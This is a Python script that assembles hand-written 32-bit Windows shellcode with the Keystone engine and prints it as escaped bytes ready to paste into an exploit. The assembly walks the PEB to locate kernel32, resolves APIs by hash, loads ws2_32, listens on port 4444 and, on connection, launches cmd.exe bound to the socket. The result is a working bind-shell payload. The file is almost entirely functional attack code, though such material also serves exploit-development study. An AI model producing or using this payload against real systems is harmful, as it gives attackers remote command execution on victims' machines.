import ctypes, struct
from keystone import *
import binascii

CODE = (
    " start:                             "  #
    "   mov   ebp, esp                  ;"  #
    "   add   esp, 0xfffff9f0           ;"  #   Shift ESP using Neg addition

    " find_kernel32:                     "  #
    "   xor   ecx, ecx                  ;"  #
    "   mov   esi,fs:[ecx+0x30]         ;"  #   fs:[0] = TEB, fs[0x30] = PEB
    "   mov   esi,[esi+0x0C]            ;"  #   ESI = PEB->Ldr
    "   mov   esi,[esi+0x1C]            ;"  #   ESI = PEB->Ldr.InInitializationOrderModuleList

    " next_module:                       "  #
    "   mov   ebx, [esi+0x08]           ;"  #   EBX = InInitOrder[X].base_address
    "   mov   edi, [esi+0x20]           ;"  #   EDI = InInitOrder[X].module_name
    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
    "   cmp   [edi+12*2], cx            ;"  #   (unicode) modulename[12] == 0x00 ?
    "   jne   next_module               ;"  #   No: try next module

    " find_function_shorten:             "  #
    "   jmp find_function_shorten_bnc   ;"  #   Short jump

    " find_function_ret:                 "  #
    "   pop esi                         ;"  #   POP the return address from the stack
    "   mov   [ebp+0x04], esi           ;"  #   Save find_function address for later usage
    "   jmp resolve_symbols_kernel32    ;"  #

    " find_function_shorten_bnc:         "  #   
    "   call find_function_ret          ;"  #   Relative CALL with negative offset

    " find_function:                     "  #
    "   pushad                          ;"  #   Save all registers
                                            #   Base address of kernel32 is in EBX from 
                                            #   Previous step (find_kernel32)
    "   mov   eax, [ebx+0x3c]           ;"  #   Offset to PE Signature
    "   mov   edi, [ebx+eax+0x78]       ;"  #   Export Table Directory RVA
    "   add   edi, ebx                  ;"  #   Export Table Directory VMA
    "   mov   ecx, [edi+0x18]           ;"  #   NumberOfNames
    "   mov   eax, [edi+0x20]           ;"  #   AddressOfNames RVA
    "   add   eax, ebx                  ;"  #   AddressOfNames VMA
    "   mov   [ebp-4], eax              ;"  #   Save AddressOfNames VMA for later

    " find_function_loop:                "  #
    "   jecxz find_function_finished    ;"  #   Jump to the end if ECX is 0
    "   dec   ecx                       ;"  #   Decrement our names counter
    "   mov   eax, [ebp-4]              ;"  #   Restore AddressOfNames VMA
    "   mov   esi, [eax+ecx*4]          ;"  #   Get the RVA of the symbol name
    "   add   esi, ebx                  ;"  #   Set ESI to the VMA of the current symbol name

    " compute_hash:                      "  #
    "   xor   eax, eax                  ;"  #   NULL EAX
    "   cdq                             ;"  #   NULL EDX
    "   cld                             ;"  #   Clear direction

    " compute_hash_again:                "  #
    "   lodsb                           ;"  #   Load the next byte from esi into al
    "   test  al, al                    ;"  #   Check for NULL terminator
    "   jz    compute_hash_finished     ;"  #   If the ZF is set, we've hit the NULL term
    "   ror   edx, 0x0d                 ;"  #   Rotate edx 13 bits to the right
    "   add   edx, eax                  ;"  #   Add the new byte to the accumulator
    "   jmp   compute_hash_again        ;"  #   Next iteration

    " compute_hash_finished:             "  #

    " find_function_compare:             "  #
    "   cmp   edx, [esp+0x24]           ;"  #   Compare the computed hash with the requested hash
    "   jnz   find_function_loop        ;"  #   If it doesn't match go back to find_function_loop
    "   mov   edx, [edi+0x24]           ;"  #   AddressOfNameOrdinals RVA
    "   add   edx, ebx                  ;"  #   AddressOfNameOrdinals VMA
    "   mov   cx,  [edx+2*ecx]          ;"  #   Extrapolate the function's ordinal
    "   mov   edx, [edi+0x1c]           ;"  #   AddressOfFunctions RVA
    "   add   edx, ebx                  ;"  #   AddressOfFunctions VMA
    "   mov   eax, [edx+4*ecx]          ;"  #   Get the function RVA
    "   add   eax, ebx                  ;"  #   Get the function VMA
    "   mov   [esp+0x1c], eax           ;"  #   Overwrite stack version of eax from pushad

    " find_function_finished:            "  #
    "   popad                           ;"  #   Restore registers
    "   ret                             ;"  #

    " resolve_symbols_kernel32:          "
    "   push  0x78b5b983                ;"  #   TerminateProcess hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x10], eax           ;"  #   Save TerminateProcess address for later usage
    "   push  0xec0e4e8e                ;"  #   LoadLibraryA hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x14], eax           ;"  #   Save LoadLibraryA address for later usage
    "   push  0x16b3fe72                ;"  #   CreateProcessA hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x18], eax           ;"  #   Save CreateProcessA address for later usage

    " load_ws2_32:                       "  #
    "   xor   eax, eax                  ;"  #   NULL EAX
    "   mov   ax, 0x3233                ;"  #   Move the end of the string in AX
    "   push  eax                       ;"  #   Push EAX on the stack with string NULL terminator
    "   push  0x5f327377                ;"  #   Push another part of the string on the stack
    "   push  esp                       ;"  #   Push ESP to have a pointer to the string
    "   call dword ptr [ebp+0x14]       ;"  #   Call LoadLibraryA

    " resolve_symbols_ws2_32:            "
    "   mov   ebx, eax                  ;"  #   Move the base address of ws2_32.dll to EBX
    "   push  0x3bfcedcb                ;"  #   WSAStartup hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x1C], eax           ;"  #   Save WSAStartup address for later usage
    "   push  0xadf509d9                ;"  #   WSASocketA hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x20], eax           ;"  #   Save WSASocketA address for later usage
    "   push  0xc7701aa4                ;"  #   bind hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x24], eax           ;"  #   Save bind address for later usage
    "   push  0xe92eada4                ;"  #   listen hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x28], eax           ;"  #   Save listen address for later usage
    "   push  0x498649e5                ;"  #   accept hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x2c], eax           ;"  #   Save WSAConnect address for later usage

    " call_wsastartup:                   "  #
    "   xor eax, eax                    ;"
    "   mov ax, 0x190 ;"
    "   sub esp, eax                   ;"  #   Move ESP to EAX
    "   push  esp                       ;"  #   Push lpWSAData
    "   push  eax                       ;"  #   Push wVersionRequired
    "   call dword ptr [ebp+0x1C]       ;"  #   Call WSAStartup

    " call_wsasocketa:                   "  #
    "   xor   eax, eax                  ;"  #   NULL EAX
    "   push  eax                       ;"  #   Push dwFlags
    "   push  eax                       ;"  #   Push g
    "   push  eax                       ;"  #   Push lpProtocolInfo
    "   push  eax                       ;"  #   Push protocol
    "   inc eax                         ;"  #   AL = 0x01
    "   push  eax                       ;"  #   Push type
    "   inc   eax                       ;"  #   Increase EAX, EAX = 0x02
    "   push  eax                       ;"  #   Push af
    "   call dword ptr [ebp+0x20]       ;"  #   Call WSASocketA

    " call_bind:                        ;"  #
    "   mov   esi, eax                  ;"  #   Move the SOCKET descriptor to ESI
    "   xor   eax, eax                  ;"  #   NULL EAX
    "   push  eax                       ;"  #   Push sin_zero[4]
    "   push  eax                       ;"  #   Push sin_zero[0]
    "   push eax                        ;"  # listen addr = 0.0.0.0 
    "   mov  edi, 0xa3eefffe            ;"  #   sin_port(4444) + sin_family(0x0002)
    "   neg edi                         ;"
    "   push edi                        ;"
    "   push  esp                       ;"  #   Push pointer to the sockaddr_in structure
    "   pop   edi                       ;"  #   Store pointer to sockaddr_in in EDI
    "   xor   eax, eax                  ;"  #   NULL EAXa
    "   add   al, 0x10                  ;"  #   Set AL to 0x10
    "   push  eax                       ;"  #   Push namelen
    "   push  edi                       ;"  #   Push *name
    "   push  esi                       ;"  #   Push s
    "   call dword ptr [ebp + 0x24]       ;"  #   Call bind()

    "call_listen:                       ;"
    "   push 0x7fffffff                 ;"  # backlog
    "   push esi                        ;"  # socket
    "   call dword ptr [ebp + 0x28]     ;"  # listen()  
    
    "call_accept:                       ;"
    "   xor eax, eax                    ;"
    "   push eax                        ;"  # addr_len
    "   push eax                        ;"  # addr
    "   push esi                        ;"  # socket
    "   call dword ptr [ebp + 0x2c]     ;"  # accept()
    "   mov esi, eax                    ;"

    " create_cmd_string:                ;"  #
    "   mov   eax, 0xff9b929d           ;"  #   
    "   neg   eax                       ;"  #   Negate EAX, EAX = 0065786
    "   push eax                        ;"  #   cmd\x00
    "   mov ebx, esp                    ;"

    " create_startupinfoa:               ;"  #
    "   push  esi                       ;"  #   STARTUPINFOA.hStdError->SOCKET
    "   push  esi                       ;"  #   STARTUPINFOA.hStdOutput->SOCKET
    "   push  esi                       ;"  #   STARTUPINFOA.hStdInput->SOCKET
    "   xor   eax, eax                  ;"  #   
    "   xor   edi, edi                  ;"
    "   push  0x12                      ;"
    "   pop   ecx                       ;"  
    
    "push_loop:                         ;"
    "   push  edi                       ;"
    "   loop  push_loop                 ;"
    "   mov   word ptr [esp + 0x3c], 0x101 ;" # StartupInfoA.dwFlags->0x101
                                              # 0x100 = STARTF_USESTDHANDLES
                                              # 0x01 = STARTF_USESHOWWINDOW
    "   lea   eax, [esp + 0x10]         ;"  #   StartupInfoA
    "   mov   byte ptr [esp+0x10], 0x44 ;"  #   StartupInfoA.cb->0x44
    "   mov  edx, esp                   ;"  
    "   push edx                        ;"  #   lpProcessInformation
    "   push  eax                       ;"  #   lpStartUpInfo
    "   push  edi                       ;"  #   lpCurrentIdrectory
    "   push  edi                       ;"  #   lpEnvironment
    "   push  edi                       ;"  #   dwCreationFlags
    "   inc   edi                       ;"
    "   push  edi                       ;"  #   bInheritHandles
    "   dec   edi                       ;"  
    "   push  edi                       ;"  #   lpThreadAttributes
    "   push  edi                       ;"  #   lpProcessAttributes
    "   push  ebx                       ;"  #   lpCommandLine
    "   push  edi                       ;"  #   lpApplicationName
    "   call dword ptr [ebp+0x18]       ;"  #   Call CreateProcessA

    "call_terminateprocess:              "
    "   xor   eax, eax                  ;"  #   NULL EAX
    "   push  eax                       ;"  #   push uExitCode
    "   dec   eax                       ;"  #   EAX = 0xFFFFF = current process
    "   push  eax                       ;"  #   push hProcess
    "   call dword ptr [ebp+0x10]       ;"  #   call TerminateProcess
)

# Initialize engine in X86-32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

sh = b""
for e in encoding:
    sh += struct.pack("B", e)

shellcode = bytearray(sh)
shellcode = binascii.hexlify(shellcode)

payload = (b"\\x"+b"\\x".join(shellcode[i:i+2] for i in range (0, len(shellcode), 2))).decode('utf-8')
print(payload)
